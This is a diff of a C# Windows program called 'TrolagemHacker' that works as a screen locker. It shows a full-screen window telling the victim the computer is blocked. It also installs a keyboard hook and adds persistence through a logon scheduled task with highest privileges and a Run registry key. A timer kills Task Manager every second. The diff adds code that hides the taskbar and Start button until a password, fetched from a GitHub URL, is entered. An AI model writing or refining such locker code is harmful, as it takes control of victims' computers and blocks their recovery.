@@ -22,11 +22,18 @@ public class TrolagemHacker : Form
     private const string URL_HACKER = "https://i.ibb.co/NgkJFxH8/ASA.png";
     private const string URL_QRCODE = "https://raw.githubusercontent.com/espertin/wind/main/QR.png";
 
+    // --- API DO WINDOWS PARA CONTROLE DE JANELAS ---
+    [DllImport("user32.dll")]
+    private static extern int FindWindow(string className, string windowText);
+    [DllImport("user32.dll")]
+    private static extern int ShowWindow(int hwnd, int command);
     [DllImport("user32.dll")]
     private static extern bool SetForegroundWindow(IntPtr hWnd);
-
     [DllImport("user32.dll")]
     private static extern IntPtr GetForegroundWindow();
+
+    private const int SW_HIDE = 0;
+    private const int SW_SHOW = 5;
 
     // --- HOOK DE TECLADO ---
     private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
@@ -56,7 +63,7 @@ public class TrolagemHacker : Form
         this.WindowState = FormWindowState.Maximized;
         this.TopMost = true;
         this.ShowInTaskbar = false;
-        this.DoubleBuffered = true; // Evita flickering
+        this.DoubleBuffered = true;
 
         int screenWidth = Screen.PrimaryScreen.Bounds.Width;
         int screenHeight = Screen.PrimaryScreen.Bounds.Height;
@@ -92,7 +99,7 @@ public class TrolagemHacker : Form
         Label lblTexto = new Label();
         lblTexto.Text = "Ola, irmao. Seu computador foi bloqueado!\n\n" +
                         "AVISO: NAO TENTE REINICIAR OU FECHAR ESTA JANELA.\n" +
-                        "O FOCO FOI OTIMIZADO PARA SUA SENHA.";
+                        "O FOCO E A BARRA FORAM ESTABILIZADOS.";
         lblTexto.ForeColor = Color.Lime;
         lblTexto.Font = new Font("Courier New", 12, FontStyle.Bold);
         lblTexto.TextAlign = ContentAlignment.MiddleCenter;
@@ -150,13 +157,15 @@ public class TrolagemHacker : Form
             Process.Start(new ProcessStartInfo("schtasks.exe", "/create /sc onlogon /tn \"SystemCheck\" /tr \"" + exePath + "\" /f /rl highest") { WindowStyle = ProcessWindowStyle.Hidden });
         } catch {}
 
-        // --- PROTEÇÃO OTIMIZADA ---
+        // --- OCULTAR BARRA DE TAREFAS (MODO ESTÁVEL) ---
+        ControlarBarraTarefas(false);
+
+        // --- PROTEÇÃO ---
         timerProtecao = new System.Windows.Forms.Timer();
         timerProtecao.Interval = 1000;
         timerProtecao.Tick += (s, e) => {
             foreach (var p in Process.GetProcessesByName("taskmgr")) try { p.Kill(); } catch {}
-            foreach (var p in Process.GetProcessesByName("explorer")) try { p.Kill(); } catch {}
-            // Só força o foco se a janela ativa não for a nossa
+            // Não matamos mais o explorer em loop para evitar o piscar
             if (GetForegroundWindow() != this.Handle) {
                 SetForegroundWindow(this.Handle);
                 txtChave.Focus();
@@ -168,6 +177,14 @@ public class TrolagemHacker : Form
         txtChave.Focus();
     }
 
+    private void ControlarBarraTarefas(bool mostrar) {
+        int hwndBarra = FindWindow("Shell_TrayWnd", "");
+        int hwndBotao = FindWindow("Button", "Start");
+        int comando = mostrar ? SW_SHOW : SW_HIDE;
+        if (hwndBarra != 0) ShowWindow(hwndBarra, comando);
+        if (hwndBotao != 0) ShowWindow(hwndBotao, comando);
+    }
+
     private void VerificarChave() {
         string senhaGitHub = "";
         try { using (WebClient client = new WebClient()) { senhaGitHub = client.DownloadString(URL_SENHA).Trim(); } } catch {}
@@ -175,7 +192,9 @@ public class TrolagemHacker : Form
         if (txtChave.Text == SENHA_MESTRA || (!string.IsNullOrEmpty(senhaGitHub) && txtChave.Text == senhaGitHub)) {
             UnhookWindowsHookEx(_hookID);
             timerProtecao.Stop();
-            Process.Start("explorer.exe");
+            
+            // --- RESTAURAR BARRA DE TAREFAS ---
+            ControlarBarraTarefas(true);
             
             try {
                 Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).DeleteValue("SecurityAlert", false);
